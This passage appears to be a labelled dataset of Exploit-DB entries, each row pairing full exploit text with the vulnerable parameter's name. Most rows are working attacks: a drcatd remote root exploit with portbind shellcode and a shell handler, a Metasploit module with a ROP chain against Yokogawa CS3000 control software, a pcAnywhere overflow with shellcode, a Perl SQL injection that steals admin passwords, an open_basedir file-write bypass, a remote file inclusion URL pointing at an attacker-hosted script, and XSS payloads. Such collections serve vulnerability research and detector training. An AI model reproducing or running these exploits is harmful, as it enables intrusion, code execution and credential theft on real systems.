= 300 (xnu-792.6.70),  3rd arg unused */         syscall(300, 0x8000000, 0xdeadface, 0xffffffff);         return 0; }","[""'Shared_Region_Make_Private_Np'""]",1
2227,"SportsPHool 1.0 - 'mainnav' Remote File Inclusion /* +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + -   - - [DEVIL TEAM THE BEST POLISH TEAM] - - + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + - SportsPHool <= 1.0 (mainnav) Remote File Include Vulnerability + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + - [Script name: SportsPHool v.1.0 - [Script site: http://sourceforge.net/projects/sportsphool + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + -          Find by: Kacper (a.k.a Rahim) + -          Contact: kacper1964@yahoo.pl -                        or -          http://www.devilteam.yum.pl/ -                       and -           http://www.rahim.webd.pl/ + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + - Special Greetz: DragonHeart ;-) - Ema: Leito, Adam, DeathSpeed, Drzewko, pepi - !@ Przyjazni nie da sie zamienic na marne korzysci @! + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + -            Z Dedykacja dla osoby, -         bez ktorej nie mogl bym zyc... -           K.C:* J.M (a.k.a Magaja) + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */ #Exploit:  http://www.site.com/[SportsPHool_path]/includes/layout/plain.footer.php?mainnav=[http://www.myevilsite.com/evil_scripts.txt]  # milw0rm.com [2006-08-20]","[""'mainnav'""]",1
9842,"PHP 5.3.0 - 'pdflib' Arbitrary File Write Description: ------------ Via this bug , attacker can save a file in path that not allowed in open_basedir .  Reproduce code: --------------- <?php // Author : Sina Yazdanmehr (R3d.W0rm) ; Our Site : http://IrCrash.com if(!extension_loaded('pdf')){    die('pdf extension required .');    }else{     $__PATH = $_GET['p']; /*The path that u want save file in .ex: /etc/file.php*/     $__VALUE = $_GET['v']; /*The text that u want save in file .ex: <?php include $_GET[f];?>*/     if(!isset($__PATH,$__VALUE)){         die('/expl.php?p=[path_u_want_save_file]/[file_name]&v=[value_u_want_sav e_in_file]');     }     $__IRCRASH = pdf_new();     pdf_open_file($__IRCRASH,$__PATH);     pdf_begin_page($__IRCRASH,612,792);     pdf_add_note($__IRCRASH,100,650,200,750,$__VALUE,'R3d.W0rm','note',0);     pdf_end_page($__IRCRASH);     pdf_close($__IRCRASH);     pdf_delete($__IRCRASH);     print('<p>IrCrash Security Team .</p>');     print('<p>' . $__PATH . ""\n""  . 'created .</p>');} ?>  Expected result: ---------------- When attacker run this code , a file in a path that attacker input in `p` in url , whith value that attacker input in `v` in url.","[""'pdflib'""]",1
359,"Drcat 0.5.0-beta - 'drcatd' Remote Code Execution /*  Proof of Concept DRCATD Remote exploit                                by Taif __ Test: [root@localhost drcat]# ./drcat -d 127.0.0.1 -u taif -p test Public code by Taif drcat-0.5.0-beta ('remote r00t' proof) Bug found by Khan Shirani  host: +-+-+-+-+-+-+-+       127.0.0.1 |C|L|U|P|C|S|R| user: |O|O|S|A|O|E|O|            taif |O|G|E|S|D|N|O| password: |N|O|R|S|E|D|T|            test | | | | | | | | ---------retaddr---+-+-+-+-+-+-+-+        bfefc000 * * * * * * X        bfefbfd1 * * * * * * X        bfefbfa2 * * * * * * X        bfefbf73 * * * * * * X        bfefbf44 * * * * * * X        bfefbf15 * * * * * * X        bfefbee6 * * * * * * X        bfefbeb7 * * * * * * X        bfefbe88 * * * * * * X        bfefbe59 * * * * * * X        bfefbe2a * * * * * * X        bfefbdfb * * * * * * X        bfefbdcc * * * * * * X        bfefbd9d * * * * * * X        bfefbd6e * * * * * * X        bfefbd3f * * * * * * X        bfefbd10 * * * * * * X        bfefbce1 * * * * * * X        bfefbcb2 * * * * * * X        bfefbc83 * * * * * * X        bfefbc54 * * * * * * X        bfefbc25 * * * * * * X        bfefbbf6 * * * * * * X        bfefbbc7 * * * * * * X        bfefbb98 * * * * * * X        bfefbb69 * * * * * * X        bfefbb3a * * * * * * X        bfefbb0b * * * * * * X        bfefbadc * * * * * * X        bfefbaad * * * * * * X        bfefba7e * * * * * * X        bfefba4f * * * * * * X        bfefba20 * * * * * * X        bfefb9f1 * * * * * * X        bfefb9c2 * * * * * * X        bfefb993 * * * * * * X        bfefb964 * * * * * * X        bfefb935 * * * * * * X        bfefb906 * * * * * * X        bfefb8d7 * * * * * * X        bfefb8a8 * * * * * * X        bfefb879 * * * * * * X        bfefb84a * * * * * * X        bfefb81b * * * * * * X        bfefb7ec * * * * * * X        bfefb7bd * * * * * * X        bfefb78e * * * * * * X        bfefb75f * * * * * * X        bfefb730 * * * * * * X        bfefb701 * * * * * * X        bfefb6d2 * * * * * * X        bfefb6a3 * * * * * * X        bfefb674 * * * * * * X        bfefb645 * * * * * * X        bfefb616 * * * * * * X        bfefb5e7 * * * * * * X        bfefb5b8 * * * * * * X        bfefb589 * * * * * * X        bfefb55a * * * * * * X        bfefb52b * * * * * * X        bfefb4fc * * * * * * * * HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN * Linux localhost.localdomain 2.4.26 #9 P ?ec 2 09:20:29 CEST 2004 i686 athlon i386 GNU/Linux uid=500(taif) gid=500(taif) groups=500(taif) 10:04pm up 1:00, 1 user, load average: 0.42, 0.35, 0.20 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT ....   NOTE: Use this on your own risk!! This exploit is unnecessary!! */   #include <stdio.h> #include <netdb.h> #include <unistd.h>  #define MAXDATASIZE (1024 * 4)  /* Color Pallete ... i love colors;) */ #define YELLOW ""\E[33m"" #define GREEN ""\E[32m"" #define RED ""\E[31m"" #define RESTORE ""\E[0m""   #define PRINTGREEN(string) \        printf(""%s%s%s"",GREEN,string,RESTORE); \        fflush(stdout);  #define PRINTRED(string) \        printf(""%s%s%s"",RED,string,RESTORE); \        fflush(stdout);  #define PRINTYELLOW(string) \        printf(""%s%s%s"",YELLOW,string,RESTORE); \        fflush(stdout);  /* portbind 20000 (by bighawk) * * +setuid() */ char code[] = ""\x31\xc0"" /* xorl %eax,%eax */ ""\x31\xdb"" /* xorl %ebx,%ebx */ ""\xb0\x17"" /* movb $0x17,%al */ ""\xcd\x80"" /* int $0x80 */ ""\x31\xdb"" /* xor ebx, ebx */ ""\xf7\xe3"" /* mul ebx */ ""\xb0\x66"" /* mov al, 102 */ ""\x53"" /* push ebx */ ""\x43"" /* inc ebx */ ""\x53"" /* push ebx */ ""\x43"" /* inc ebx */ ""\x53"" /* push ebx */ ""\x89\xe1"" /* mov ecx, esp */ ""\x4b"" /* dec ebx */ ""\xcd\x80"" /* int 80h */ ""\x89\xc7"" /* mov edi, eax */ ""\x52"" /* push edx */ ""\x66\x68\x4e\x20""/* push word 8270 */ ""\x43"" /* inc ebx */ ""\x66\x53"" /* push bx */ ""\x89\xe1"" /* mov ecx, esp */ ""\xb0\xef"" /* mov al, 239 */ ""\xf6\xd0"" /* not al */ ""\x50"" /* push eax */ ""\x51"" /* push ecx */ ""\x57"" /* push edi */ ""\x89\xe1"" /* mov ecx, esp */ ""\xb0\x66"" /* mov al, 102 */ ""\xcd\x80"" /* int 80h */ ""\xb0\x66"" /* mov al, 102 */ ""\x43"" /* inc ebx */ ""\x43"" /* inc ebx */ ""\xcd\x80"" /* int 80h */ ""\x50"" /* push eax */ ""\x50"" /* push eax */ ""\x57"" /* push edi */ ""\x89\xe1"" /* mov ecx, esp */ ""\x43"" /* inc ebx */ ""\xb0\x66"" /* mov al, 102 */ ""\xcd\x80"" /* int 80h */ ""\x89\xd9"" /* mov ecx, ebx */ ""\x89\xc3"" /* mov ebx, eax */ ""\xb0\x3f"" /* mov al, 63 */ ""\x49"" /* dec ecx */ ""\xcd\x80"" /* int 80h */ ""\x41"" /* inc ecx */ ""\xe2\xf8"" /* loop lp */ ""\x51"" /* push ecx */ ""\x68\x6e\x2f\x73\x68""/* push dword 68732f6eh */ ""\x68\x2f\x2f\x62\x69""/* push dword 69622f2fh */ ""\x89\xe3"" /* mov ebx, esp */ ""\x51"" /* push ecx */ ""\x53"" /* push ebx */ ""\x89\xe1"" /* mov ecx, esp */ ""\xb0\xf4"" /* mov al, 244 */ ""\xf6\xd0"" /* not al */ ""\xcd\x80""; /* int 80h */  void banner() { fprintf(stderr,""Public code by Taif \n""               ""drcat-0.5.0-beta (\'remote r00t\' proof)\n""               ""Bug found by Khan Shirani \n\n""); }  void usage (char *progname) { int i; fprintf (stderr, ""usage: %s arguments \n\n""                 ""-d hostanme (127.0.0.1) \n""                 ""-u user (NULL) \n""                 ""-p password (NULL) \n""                 ""-P port (3535) \n""                 ""-t timeout (1000=1s) (300) \n""                 ""\n"", progname);   exit (0); }  int conn(char *ip,int port) { int sock; struct hostent *host; struct sockaddr_in addr;  if((host=gethostbyname(ip))==NULL)  { PRINTRED(""X\ngethostbyname()\n""); exit(1); }  addr.sin_family=AF_INET; addr.sin_port=htons(port); addr.sin_addr=*((struct in_addr *)host->h_addr); memset(&(addr.sin_zero),0,8);   if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)  { PRINTRED(""X\nsocket()\n""); exit(1); }  if(connect(sock,(struct sockaddr *)&addr,sizeof(struct sockaddr))==-1)  { PRINTRED(""X\n""); return(-1);}  return(sock); }  void login(int sock,char* user,char *pass) { char buffer[1024]; int n;  memset(buffer,0,sizeof(buffer)); n=recv(sock, buffer, 6, 0); if(n<0) { PRINTRED(""\nrecv()\n""); exit(1); } if(n==6)  {  if(strcmp(buffer, ""drcatd"")) {PRINTYELLOW(""* "");}    else {PRINTGREEN(""* "");};  } else {PRINTYELLOW(""* "");}  if(send(sock, user, strlen(user), 0) == -1)  {PRINTRED(""\nsend()\n"");close(sock);exit(1);}  n=recv(sock, buffer, 1, 0); if(buffer[0] == '0')  {  PRINTRED(""X\nINVALID USER\n"");  close(sock);  exit(1);  } else {PRINTGREEN(""* "")};  if(send(sock, pass, strlen(pass), 0) == -1)  {PRINTRED(""send()\n"");close(sock);exit(1);}  n=recv(sock, buffer, 1, 0);  if(buffer[0] == '0')  {  PRINTRED(""X\nINVALID PASSWORD\n"");  close(sock);  exit(1);  } return; }  /* change with care */ #define TOP 290  void makec0de(char* haox,unsigned int ret) { int i;  memset(haox,0,512); memset(haox,0x90,TOP); for (i=0;i<sizeof(code)-1;i++) haox[TOP-sizeof(code)+i]=code[i]; /* yeah fucking thing (ret%4) */ for (i=TOP-(ret%4);i<504;i=i+4) *(long *)&haox[i]=ret; }  void send_it(int sock,char* buffer) { int len;  len=strlen(buffer); if (send(sock, buffer, len, 0) == -1)  {  PRINTRED(""X\nsend()\n"");  close(sock);  exit(1);  } return; }  int sh(int sock) { char snd[1024], rcv[1024]; fd_set rset; int maxfd, n; int received = 0;  //strcpy(snd,""TERM=xterm; export TERM=xterm; exec bash -i\n""); //write(sock, snd, strlen(snd));  strcpy(snd, ""uname -a; id; w\n""); write(sock, snd, strlen(snd));  for (;;) { FD_SET(fileno(stdin), &rset); FD_SET(sock, &rset);  maxfd = ( ( fileno(stdin) > sock )?fileno(stdin):sock ) + 1; select(maxfd, &rset, NULL, NULL, NULL);  if (FD_ISSET(fileno(stdin), &rset))  {  bzero(snd, sizeof(snd));  fgets(snd, sizeof(snd)-2, stdin);  write(sock, snd, strlen(snd));  }  if (FD_ISSET(sock, &rset))  {  bzero(rcv, sizeof(rcv));  if ((n = read(sock, rcv, sizeof(rcv))) == -1)    {    printf(""FUCK: Error in read\n"");    exit(1);    }  if (!n)    {    if (!received)      {      printf(""FUCK: failed.\n\n"");      return 0;      }    printf(""Connection closed.\n"");    exit(1);    }   received = 1;  fputs(rcv, stdout);  fflush(stdout);  } } }  int main(int argc, char *argv[]){ char buff[MAXDATASIZE]; char *host, *user,*pass,c; int sockfd,sockfd2; int port = 3535; int time = 300; int ret=0xc0000000-(MAXDATASIZE*260);  host=""127.0.0.1""; user=NULL; pass=NULL;  banner(); if (argc<2) usage (argv[0]);  while((c=getopt(argc,argv,""?hd:u:p:P:t:""))!=-1)        {                switch(c)                {                case 't':                                time=atoi(optarg);                                break;                case 'P':                                port=atoi(optarg);                                break;                case 'u':                                user=optarg;                                break;                case 'd':                                host=optarg;                                break;                case 'p':                                pass=optarg;                                break;                case '?':                case 'h':                default:                                usage (argv[0]);                                break;                 }        }  if (host==NULL)  {PRINTRED(""Set host!\n"");usage (argv[0]);} if (user==NULL)  {PRINTRED(""Set user!\n"");usage (argv[0]);} if (pass==NULL)  {PRINTRED(""Set password!\n"");usage (argv[0]);}   printf("" host: +-+-+-+-+-+-+-+\n""       ""%16s |C|L|U|P|C|S|R|\n""       "" user: |O|O|S|A|O|E|O|\n""       ""%16s |O|G|E|S|D|N|O|\n""       "" password: |N|O|R|S|E|D|T|\n""       ""%16s | | | | | | | |\n""       ""---------retaddr---+-+-+-+-+-+-+-+\n""       ,host,user,pass);fflush(stdout); while(1) { printf(""%16x "",ret);fflush(stdout); sockfd=conn(host,port); if (sockfd<0) {PRINTRED(""connect()\n"");exit(1);}  else PRINTGREEN(""* ""); login(sockfd,user,pass);PRINTGREEN(""* ""); makec0de(buff,ret);PRINTGREEN(""* ""); send_it(sockfd,buff);PRINTGREEN(""* ""); close(sockfd); usleep(time*1000); sockfd=conn(host,20000); if (!(sockfd<0))  {  PRINTGREEN(""*\n"");  PRINTGREEN(""* HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN *\n"");  sh(sockfd);  close(sockfd);  exit(0);  } ret=ret-((TOP-sizeof(code))/4); } exit(0);  }  // milw0rm.com [2004-07-22]","[""'drcatd'""]",1
16955,"SmarterMail 7.3/7.4 - Multiple Vulnerabilities Author: Hoyt LLC Research | http://xss.cx | http://cloudscan.me Identified: October 28, 2010  Vendor: SmarterTools Application: SmarterMail 7.x Bug(s): Stored XSS, Reflected XSS, Directory Traversal, File Upload Parameters, OS Execution, XML Injection, LDAP Injection, DoS  Patch: The Vendor has released SmarterMail Version 8 at URI http://www.smartertools.com/Download.aspx?Product=SmarterMail&File=Installer&Version=8&Location=Primary  Timeline: Notify Vendor 10-28-2011 on Version 7.3 with respect to Stored XSS, other Vulns               Vendor updates to Version 7.4 on 12.30.2010, Notify Vendor of Stored XSS, other Vulns               Vendor updates to Version 8.0 on 3.10.2011  Publication: March 10, 2011 | Hoyt LLC Research publishes vulnerability information for SmarterMail Version 7.3 and 7.4, building on Version 7.1 and 7.2 exploits known as CVE-2010-3486 and CVE-2010-3425 at URI http://www.cloudscan.me/2011/03/smartermail-73-74-full-disclosure-xss.html.  Hoyt LLC Research | March 10, 2011  SmarterMail Versions 7.x | CWE-79: The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users. Stored XSS - CWE-79, CAPEC-86 - SmarterMail Version 7.x Series Summary  Severity:  	High Confidence:  	Certain Host:  	http://SmarterMail 7.x.Hosts Path:  	/Main/frmPopupContactsList.aspx Issue detail - Confirmed in Versions 7.1, 7.2, 7.3 and 7.4  The value of the ctl00%24MPH%24wucContactInfo%24txtEmailAddress_SettingText request parameter submitted to the URL /Main/frmContact.aspx is copied into the HTML document as plain text between tags at the URL /Main/frmPopupContactsList.aspx. The payload 9e8e5<script>alert(1)</script>5b211c9e81 was submitted in the ctl00%24MPH%24wucContactInfo%24txtEmailAddress_SettingText parameter. This input was returned unmodified in a subsequent request for the URL /Main/frmPopupContactsList.aspx.  Full Disclsoure - SmarterMail 7.x - Blog Posts http://www.cloudscan.me/2011/03/smartermail-73-74-full-disclosure-xss.html http://www.cloudscan.me/2010/09/smartermail-7x-713876-bugs-cross-site.html http://www.cloudscan.me/2010/09/smarter-mail-7x-713876-file-fuzzing.html http://www.cloudscan.me/2010/10/vendor-smartertoolscom-smartermail-7x_07.html http://www.cloudscan.me/2010/10/vendor-smartertoolscom-smartermail-7x.html http://www.cloudscan.me/2010/10/smartermail-7x-723925.html  Full Disclosure- SmarterMail 7.x - Burp Suite Pro 1.3.08 + Netsparker Audit Reports, HTML, XML Files, Screen Grabs. http://xss.cx/examples/sm_7.2.3925_interim_report_1.htm http://xss.cx/examples/sm_7.2.3925_interim_report_2.htm http://xss.cx/examples/smartermail-7.2-report-interim-3.html http://xss.cx/examples/sm-72-target.html http://xss.cx/examples/sm_7.2.3925_stored_xss_audit_example.html http://xss.cx/examples/sm_7.2.3925_file2_burp_1.3.08.html",['frmContact.aspx '],1
33331,"Yokogawa CS3000 - 'BKESimmgr.exe' Remote Buffer Overflow (Metasploit) ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::Remote::Tcp    def initialize(info = {})     super(update_info(info,       'Name'           => 'Yokogawa CS3000 BKESimmgr.exe Buffer Overflow',       'Description'    => %q{         This module exploits an stack based buffer overflow on Yokogawa CS3000. The vulnerability         exists in the BKESimmgr.exe service when handling specially crafted packets, due to an         insecure usage of memcpy, using attacker controlled data as the size count. This module         has been tested successfully in Yokogawa CS3000 R3.08.50 over Windows XP SP3 and Windows         2003 SP2.       },       'Author'         =>         [           'juan vazquez',           'Redsadic <julian.vilas[at]gmail.com>'         ],       'References'     =>         [           ['CVE', '2014-0782'],           ['URL', 'https://community.rapid7.com/community/metasploit/blog/2014/05/09/r7-2013-192-disclosure-yokogawa-centum-cs-3000-vulnerabilities'],           ['URL', 'http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf']         ],       'Payload'        =>         {           'Space'          => 340,           'DisableNops'    => true,           'PrependEncoder' => ""\x81\xc4\x54\xf2\xff\xff"" # Stack adjustment # add esp, -3500         },       'Platform'       => 'win',       'Targets'        =>         [           [             'Yokogawa Centum CS3000 R3.08.50 / Windows [ XP SP3 / 2003 SP2 ]',             {               'Ret'           => 0x61d1274f, # 0x61d1274f # ADD ESP,10 # RETN # libbkebatchepa.dll               'Offset'        => 64,               'FakeArgument1' => 0x0040E65C, # ptr to .data on BKESimmgr.exe               'FakeArgument2' => 0x0040EB90  # ptr to .data on BKESimmgr.exe             }           ],         ],       'DisclosureDate' => 'Mar 10 2014',       'DefaultTarget'  => 0))      register_options(       [         Opt::RPORT(34205)       ], self.class)   end    def check     data = create_pkt(rand_text_alpha(4))      res = send_pkt(data)      if res && res.length == 10       simmgr_res = parse_response(res)        if valid_response?(simmgr_res)         check_code = Exploit::CheckCode::Appears       else         check_code = Exploit::CheckCode::Safe       end     else       check_code = Exploit::CheckCode::Safe     end      check_code   end    def exploit     bof = rand_text(target['Offset'])     bof << [target.ret].pack(""V"")     bof << [target['FakeArgument1']].pack(""V"")     bof << [target['FakeArgument2']].pack(""V"")     bof << rand_text(16)  # padding (corrupted bytes)     bof << create_rop_chain     bof << payload.encoded      data = [0x1].pack(""N"")         # Sub-operation id, <= 0x8 in order to pass the check at sub_4090B0     data << [bof.length].pack(""n"")     data << bof      pkt = create_pkt(data)      print_status(""Trying target #{target.name}, sending #{pkt.length} bytes..."")     connect     sock.put(pkt)     disconnect   end    def create_rop_chain     # rop chain generated with mona.py - www.corelan.be     rop_gadgets =       [         0x004047ca, # POP ECX # RETN [BKESimmgr.exe]         0x610e3024, # ptr to &VirtualAlloc() [IAT libbkfmtvrecinfo.dll]         0x61232d60, # MOV EAX,DWORD PTR DS:[ECX] # RETN [LibBKESysVWinList.dll]         0x61d19e6a, # XCHG EAX,ESI # RETN [libbkebatchepa.dll]         0x619436d3, # POP EBP # RETN [libbkeeda.dll]         0x61615424, # & push esp #  ret  [libbkeldc.dll]         0x61e56c8e, # POP EBX # RETN [LibBKCCommon.dll]         0x00000001, # 0x00000001-> ebx         0x61910021, # POP EDX # ADD AL,0 # MOV EAX,6191002A # RETN [libbkeeda.dll]         0x00001000, # 0x00001000-> edx         0x0040765a, # POP ECX # RETN [BKESimmgr.exe]         0x00000040, # 0x00000040-> ecx         0x6191aaab, # POP EDI # RETN [libbkeeda.dll]         0x61e58e04, # RETN (ROP NOP) [LibBKCCommon.dll]         0x00405ffa, # POP EAX # RETN [BKESimmgr.exe]         0x90909090, # nop         0x619532eb  # PUSHAD # RETN [libbkeeda.dll]       ].pack(""V*"")      rop_gadgets   end    def create_pkt(data)     pkt = [0x01].pack(""N"")         # Operation Identifier     pkt << [data.length].pack(""n"") # length     pkt << data                    # Fake packet      pkt   end    def send_pkt(data)     connect     sock.put(data)     res = sock.get_once     disconnect      res   end    def parse_response(data)     data.unpack(""NnN"")   end    def valid_response?(data)     valid = false      if data && data[0] == 1 && data[1] == 4 && data[1] == 4 && data[2] == 5       valid = true     end      valid   end  end","[""'BKESimmgr.exe'""]",1
28413,cPanel 10.x - 'dohtaccess.html?dir' Cross-Site Scripting source: https://www.securityfocus.com/bid/19624/info  cPanel is prone to multiple cross-site scripting vulnerabilities. These issues are due to a lack of proper sanitization of user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/frontend/x/htaccess/dohtaccess.html?dir=[code],"[""'dohtaccess.html?dir'""]",1
15327,"Energine CMS - SQL Injection Vulnerability ID: HTB22655 Reference: http://www.htbridge.ch/advisory/sql_injection_in_energine.html Product: Energine  Vendor: Energine  ( http://energine.org/ )  Vulnerable Version:  Vendor Notification: 13 October 2010  Vulnerability Type: SQL Injection Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response Risk level: High  Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)   Vulnerability Details: The vulnerability exists due to failure in the ""/index.php"" script to properly sanitize user-supplied input in NRGNSID variable from cookie. Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.  The following PoC is available:   Cookie: NRGNSID='SQL_CODE_HERE","['index.php""']",1
34916,IBM Tivoli Access Manager for E-Business - '/ibm/wpm/user?method' Cross-Site Scripting source: https://www.securityfocus.com/bid/44382/info           IBM Tivoli Access Manager for e-business is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.           An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.           IBM Tivoli Access Manager for e-business 6.1.0 is vulnerable  http://www.example.com/ibm/wpm/user?method=props%3Cscript%3Ealert%28%22xss%22%29%3C/script%3E,"[""'/ibm/wpm/user?method'""]",1
19407,"Symantec pcAnywhere 12.5.0 - 'Login' / 'Password' Remote Buffer Overflow #!/usr/bin/python  # Exploit Title: Symantec PcAnywhere login and password field buffer overflow # Date: 2012.06.27 # Author: S2 Crew [Hungary] # Software Link: symantec.com # Version: 12.5.0 # Tested on: Windows XP SP2 # CVE: CVE-2011-3478    #EDB Note: Needs adjustment but there is a crash  # Code : import socket import time import struct import string import sys  shell = ( ""\xda\xda\xbb\x9e\x7f\xfb\x04\xd9\x74\x24\xf4\x58\x2b\xc9"" ""\xb1\x56\x31\x58\x18\x03\x58\x18\x83\xc0\x9a\x9d\x0e\xf8"" ""\x4a\xe8\xf1\x01\x8a\x8b\x78\xe4\xbb\x99\x1f\x6c\xe9\x2d"" ""\x6b\x20\x01\xc5\x39\xd1\x92\xab\x95\xd6\x13\x01\xc0\xd9"" ""\xa4\xa7\xcc\xb6\x66\xa9\xb0\xc4\xba\x09\x88\x06\xcf\x48"" ""\xcd\x7b\x3f\x18\x86\xf0\xed\x8d\xa3\x45\x2d\xaf\x63\xc2"" ""\x0d\xd7\x06\x15\xf9\x6d\x08\x46\x51\xf9\x42\x7e\xda\xa5"" ""\x72\x7f\x0f\xb6\x4f\x36\x24\x0d\x3b\xc9\xec\x5f\xc4\xfb"" ""\xd0\x0c\xfb\x33\xdd\x4d\x3b\xf3\x3d\x38\x37\x07\xc0\x3b"" ""\x8c\x75\x1e\xc9\x11\xdd\xd5\x69\xf2\xdf\x3a\xef\x71\xd3"" ""\xf7\x7b\xdd\xf0\x06\xaf\x55\x0c\x83\x4e\xba\x84\xd7\x74"" ""\x1e\xcc\x8c\x15\x07\xa8\x63\x29\x57\x14\xdc\x8f\x13\xb7"" ""\x09\xa9\x79\xd0\xfe\x84\x81\x20\x68\x9e\xf2\x12\x37\x34"" ""\x9d\x1e\xb0\x92\x5a\x60\xeb\x63\xf4\x9f\x13\x94\xdc\x5b"" ""\x47\xc4\x76\x4d\xe7\x8f\x86\x72\x32\x1f\xd7\xdc\xec\xe0"" ""\x87\x9c\x5c\x89\xcd\x12\x83\xa9\xed\xf8\xb2\xed\x23\xd8"" ""\x97\x99\x41\xde\x06\x06\xcf\x38\x42\xa6\x99\x93\xfa\x04"" ""\xfe\x2b\x9d\x77\xd4\x07\x36\xe0\x60\x4e\x80\x0f\x71\x44"" ""\xa3\xbc\xd9\x0f\x37\xaf\xdd\x2e\x48\xfa\x75\x38\x71\x6d"" ""\x0f\x54\x30\x0f\x10\x7d\xa2\xac\x83\x1a\x32\xba\xbf\xb4"" ""\x65\xeb\x0e\xcd\xe3\x01\x28\x67\x11\xd8\xac\x40\x91\x07"" ""\x0d\x4e\x18\xc5\x29\x74\x0a\x13\xb1\x30\x7e\xcb\xe4\xee"" ""\x28\xad\x5e\x41\x82\x67\x0c\x0b\x42\xf1\x7e\x8c\x14\xfe"" ""\xaa\x7a\xf8\x4f\x03\x3b\x07\x7f\xc3\xcb\x70\x9d\x73\x33"" ""\xab\x25\x83\x7e\xf1\x0c\x0c\x27\x60\x0d\x51\xd8\x5f\x52"" ""\x6c\x5b\x55\x2b\x8b\x43\x1c\x2e\xd7\xc3\xcd\x42\x48\xa6"" ""\xf1\xf1\x69\xe3"" ) init1 = ( ""\x00\x00\x00\x00"" # kezdeti handshake )  init2 = ( ""\x0d\x06\xfe"" # Enter username uzenet koveti (NTdialog) )  init3 = ( ""A"" * 100 #+ ""\r"" #username )  readable_xp_sp2 = struct.pack('<L',0x023E5AD0) call_esi = struct.pack('<L',0x67f7aac4) jmp = struct.pack('<L',0x414112EB)  init4 = ( ""B"" * 1282 + jmp + readable_xp_sp2 + ""DDDD"" +call_esi + ""AAAA"" + shell + ""E"" * (4000 - 1286 - 12 - len(shell)) )  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect=s.connect(('172.16.29.133',5631)) # hardcoded IP address  print ""init packet..."" s.send(init1) # send the data time.sleep(5) data = s.recv(1024)  print ""handshake packet..."" s.send(init2) # send the data time.sleep(5) data = s.recv(1024)  print ""username packet..."" s.send(init3) # send the data time.sleep(5) #data = s.recv(1024)  print ""password packet..."" s.send(init4) # send the data s.close()","[""'Password'"", 'password field']",1
3141,"MGB 0.5.4.5 - 'email.php?id' SQL Injection #!/usr/bin/perl # ########################################################## # MGB <= 0.5.4.5 Exploit # Vulnerability found by SlimTim10 # Created By: SlimTim10 # <slimtim10@gmail.com> ########################################################## # Google dork: # ( intext:mgb.0.5.. & intext:mopzz ) | intext:mgb.0.5.4.. ##########################################################   use IO::Socket::INET;  usage() unless (@ARGV == 2);  $host = $ARGV[0]; $dir = $ARGV[1];  $dir = ""\/$dir"" if ($dir !~ /^\//); $dir = ""$dir\/"" if ($dir !~ /\/$/); $host =~ s/http:\/\///g;  $path = $dir.'email.php?id=1%20UNION%20SELECT%20null,passwort%20FROM%20mgb_settings%20--'; $socket = IO::Socket::INET->new( Proto => ""tcp"", 								 PeerAddr => ""$host"", 								 PeerPort => ""80"") 								 || die ""[-]Connect Failed: could not connect to $host\n"";  print ""[+]Connecting...\n""; print $socket ""GET $path HTTP/1.1\n""; print $socket ""Host: $host\n""; print $socket ""Accept: */*\n""; print $socket ""Connection: close\n\n""; print ""[+]Connected!\n"";  while ($answer = <$socket>) {   $answer =~ m/Email an&nbsp;(.*?)&nbsp;schreiben/ and $var = $1; }  if ($var !~ /[\da-f]{32,32}/) { 	print ""[-]Exploit failed.""; 	exit(0); }  print ""[+]Admin Password: $var\n""; print ""[+]Admin Link: http://$host"".$dir.""admin.php?sid=$var\n"";  sub usage {     print ""\n"" . ""=|=-"" x 14 . ""=|="";     print q( ]                                                         [ [       MGB <= 0.5.4.5 Remote SQL Injection Exploit       ] [                Tested on MGB <= 0.5.4.5                 ] [       Created by: SlimTim10 <slimtim10@gmail.com>       ] ]                                                         [ );     print ""=|=-"" x 14 . ""=|=\n\n"";     print ""\tUsage: $0 [HOST] [PATH]\n"";     print ""\tEx: $0 www.host.com /guestbook/\n"";     print ""\tEx: $0 host.com mgb"";     print ""\n\n"".""`^"" x 29 . ""`\n"";     exit(0); }  # milw0rm.com [2007-01-17]","[""'email.php?id'""]",1
34497,"ViArt Helpdesk - 'reviews.php?category_id' Cross-Site Scripting source: https://www.securityfocus.com/bid/42543/info     ViArt Helpdesk is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.     An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.     httpwww.example.com/helpdesk-demo/reviews.php?category_id=1>""><ScRiPt %0D%0A>alert(414577246752)%3B</ScRiPt>","[""'reviews.php?category_id'""]",1
